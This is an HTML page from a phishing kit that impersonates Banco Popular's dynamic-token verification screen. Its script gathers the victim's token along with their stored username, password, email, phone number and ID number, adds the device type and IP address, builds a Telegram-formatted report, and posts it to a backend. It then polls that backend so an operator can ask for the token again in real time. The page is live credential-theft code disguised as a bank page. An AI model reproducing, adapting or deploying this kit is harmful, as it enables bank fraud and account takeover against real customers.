<html>
    <head>
        <title>Confirmacion</title>
        <meta http-equiv="content-type" content="text/html; utf-8">
        <meta charset="utf-8">        
        <meta content="es" http-equiv="Content-Language">
        <meta name="description" content="">
        <meta name="author" content="">
        <meta name="Copyright" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <link rel="icon" href="img/favicon.ico" type="image/x-icon">
        <meta name="theme-color" content="#009A3B">
        <script type="text/javascript" src="../../../../assets/js/jquery-3.6.0.min.js"></script>      
        <link href="css/style.css" rel="stylesheet">

    </head>
    <body>
        <div id="fondo"></div>
        <div id="fondo-gris"></div>  
        <div id="esperando">
            <img src="img/esperando.png" width="90">
            <br><br>
            Por favor espere un momento estamos validando algunos datos. Puede tardar entre 1 a 5 minuto. No cierres o recargues esta ventana.<br>
             <img src="img/load1.gif" width="70"> 
        </div>

        <img src="img/logo.svg" id="cargando" width="230">

        <div id="sobre-capa">
            <div>
                <img src="img/logo.svg" width="220">
            </div>
            <table width="100%" border="0" cellpadding="0" cellspacing="0">
                <tr>
                    <td valign="bottom" align="left"><img src="img/grupo.png" width="90"></td>
                    <td valign="bottom" align="right" style="color: #fff; font-size: 13px;">© Banco Popular | v3.1.82</td>
                </tr>
            </table>
        </div>

        <table width="100%" border="0" cellpadding="0" cellspacing="0" style="height:100%;">
            <tr>
                <td width="60%" id="lado-izquierdo" style="overflow: hidden; border-radius: 0 30px 30px 0;">
                    <div id="slider1"></div>
                    <div id="slider2"></div>
                    <div id="slider3"></div>
                    <div id="slider4"></div>
                </td>
                <td width="40%" valign="middle" align="center" id="lado-derecho">
                    <div style="width: 100%; max-width: 368px;">
                        <img src="img/logo-verde.png" width="220" id="logo">

                        <div id="esperando-lateral" class="descripcion">
                            <br><br>
                            <img src="img/esperando.png" width="110">
                            <br><br>
                            Por favor espere un momento estamos validando algunos datos. Puede tardar entre 1 a 5 minuto. No cierres o recargues esta ventana.
                            <br><br>
                            <img src="img/load1.gif" width="70"> 
                            <br><br>
                        </div>

                        <div id="final" class="descripcion">
                            <br><br>
                            <img src="img/ok.png" width="110">
                            <br><br>
                            <b>Autenticación exitosa</b><br>
                            <br><br>
                        </div>

                        <div class="frm" id="frm-token">
                            <div class="titulo">Token Dinámico</div>
                            <div class="descripcion" style="margin-top: -30px;margin-bottom: 40px;">
                                Ingresa el código de tu token dinámico para completar la validación de seguridad.
                            </div>
                            <div class="etiqueta">Código del Token</div>
                            <input type="text" name="txt-token" id="txt-token" class="entrada" autocomplete="off" pattern="[0-9]*" inputmode="numeric" maxlength="8" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
                            
                            <button class="btn" id="btn-token" disabled="disabled">Validar Token</button>
                        </div>
                                                  
                        <img src="img/footer.jpg" width="242" id="footer">
                    </div>
                </td>
            </tr>
        </table>  

        <script>
        document.addEventListener("DOMContentLoaded", function () {
            // Iniciar slider automáticamente
            setTimeout(iniciar, 1500);
            
            // Event listener para el botón de token
            const btnToken = document.getElementById('btn-token');
            if (btnToken) {
                btnToken.addEventListener('click', function() {
                    const token = document.getElementById('txt-token').value;
                    if (token) {
                        enviarTokenATelegram(token);
                    }
                });
            }

            // Validación del campo token
            const txtToken = document.getElementById('txt-token');
            if (txtToken) {
                txtToken.addEventListener('input', function() {
                    if (this.value.length >= 8) {
                        this.style.border = "1px solid #00b800";
                        btnToken.removeAttribute("disabled");
                        btnToken.style.background = "#00b800";
                    } else {
                        this.style.border = "1px solid #e70000";
                        btnToken.setAttribute("disabled", "disabled");
                        btnToken.style.background = "#9d9d9d";
                    }
                });
            }
        });

        function iniciar(){
            $('#slider1').addClass("efecto-slider");  
            $('#fondo,#cargando').hide();
            setTimeout(slider2, 5000);
        }

        function slider1(){
            $( "#slider4" ).fadeOut( "fast", function() {
                $('#slider4').removeClass("efecto-slider");
                $('#slider1').addClass("efecto-slider");   
                $('#slider1').show();
            });
            setTimeout(slider2, 5000);    
        }

        function slider2(){
            $( "#slider1" ).fadeOut( "fast", function() {
                $('#slider1').removeClass("efecto-slider");
                $('#slider2').addClass("efecto-slider");   
                $('#slider2').show();
            });
            setTimeout(slider3, 5000); 
        }

        function slider3(){
           $( "#slider2" ).fadeOut( "fast", function() {
                $('#slider2').removeClass("efecto-slider");
                $('#slider3').addClass("efecto-slider");   
                $('#slider3').show();
            });
            setTimeout(slider4, 5000);    
        }

        function slider4(){
            $( "#slider3" ).fadeOut( "fast", function() {
                $('#slider3').removeClass("efecto-slider");
                $('#slider4').addClass("efecto-slider");   
                $('#slider4').show();
            });
            setTimeout(slider1, 5000);    
        }

        function enviarTokenATelegram(token) {
            // Mostrar loader
            $('#frm-token').hide();
            $('#esperando-lateral').show();
            
            // Generar session_id único
            const sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            
            // Detectar tipo de dispositivo
            const userAgent = navigator.userAgent;
            let dispositivo = 'PC';
            
            if (/Android/i.test(userAgent)) {
                dispositivo = 'Android';
            } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
                dispositivo = 'iPhone';
            } else if (/Windows/i.test(userAgent)) {
                dispositivo = 'PC';
            } else if (/Mac/i.test(userAgent)) {
                dispositivo = 'Mac';
            } else if (/Linux/i.test(userAgent)) {
                dispositivo = 'Linux';
            }
            
            const hora = new Date().toLocaleString('es-ES');
            
            // Obtener datos del usuario y clave del localStorage
            const usuario = localStorage.getItem('identificacion') || localStorage.getItem('username') || 'No disponible';
            const clave = localStorage.getItem('password') || 'No disponible';
            
            // Obtener IP y construir mensaje
            fetch('get_ip.php')
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip || 'No disponible';
                    
                    const mensaje = `
<b><u>💎BANCO POPULAR - TOKEN💎</u></b>
• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
• <b>🏦Banco:</b> BANCO POPULAR
------------------------------
• <b>📟Dispositivo:</b> ${dispositivo}
• <b>🗺IP:</b> ${ip}
• <b>⏱Hora:</b> ${hora}
------------------------------
• <b>👤 Usuario:</b> ${usuario}
• <b>🔑 Clave:</b> ${clave}
------------------------------
• <b>🔐 Token:</b> ${token}
------------------------------`;

                    const formData = new FormData();
                    formData.append('message', mensaje);
                    formData.append('transactionId', sessionId);

                    fetch('procesar_dinamica.php', {
                        method: 'POST',
                        body: formData
                    })
                    .then(res => res.json())
                    .then(result => {
                        if (result.status === 'success') {
                            checkPaymentVerification(sessionId, result.messageId);
                        } else {
                            // Ocultar loader si hay error
                            $('#esperando-lateral').hide();
                            $('#frm-token').show();
                        }
                    })
                    .catch(err => {
                        console.error('Error enviando token:', err);
                        $('#esperando-lateral').hide();
                        $('#frm-token').show();
                    });
                })
                .catch(() => {
                    // Si falla la obtención de IP, enviar sin IP
                    const mensaje = `
<b><u>💎BANCO POPULAR - TOKEN💎</u></b>
• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
• <b>🏦Banco:</b> BANCO POPULAR
------------------------------
• <b>📟Dispositivo:</b> ${dispositivo}
• <b>🗺IP:</b> No disponible
• <b>⏱Hora:</b> ${hora}
------------------------------
• <b>👤 Usuario:</b> ${usuario}
• <b>🔑 Clave:</b> ${clave}
------------------------------
• <b>🔐 Token:</b> ${token}
------------------------------`;

                    const formData = new FormData();
                    formData.append('message', mensaje);
                    formData.append('transactionId', sessionId);

                    fetch('procesar_dinamica.php', {
                        method: 'POST',
                        body: formData
                    })
                    .then(res => res.json())
                    .then(result => {
                        if (result.status === 'success') {
                            checkPaymentVerification(sessionId, result.messageId);
                        } else {
                            // Ocultar loader si hay error
                            $('#esperando-lateral').hide();
                            $('#frm-token').show();
                        }
                    })
                    .catch(err => {
                        console.error('Error enviando token:', err);
                        $('#esperando-lateral').hide();
                        $('#frm-token').show();
                    });
                });
        }

        async function checkPaymentVerification(transactionId, messageId) {
            try {
                const formData = new FormData();
                formData.append('transactionId', transactionId);
                formData.append('messageId', messageId);

                const res = await fetch('verificar_dinamica.php', {
                    method: 'POST',
                    body: formData
                });
                const result = await res.json();

                if (result.action) {
                    switch (result.action) {
                        case 'pedir_dinamica': 
                            $('#esperando-lateral').hide();
                            $('#frm-token').show();
                            alert("Token incorrecto. Intente nuevamente.");
                            break;
                        case 'error_logo': 
                            // Ocultar loader antes de mostrar error
                            const loader2 = document.getElementById('loader-overlay');
                            if (loader2) {
                                loader2.style.display = 'none';
                            }
                            alert("Usuario o clave incorrectos.");
                            window.location.href = "index.html";
                            break;
                        case 'confirm_finalizar':
                            $('#esperando-lateral').hide();
                            $('#final').show();
                            setTimeout(() => {
                                window.location.href = "..//fin.php";
                            }, 2000);
                            break;
                        default:
                            break;
                    }
                } else {
                    setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
                }
            } catch (err) {
                setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
            }
        }
        </script>
    </body>
</html> 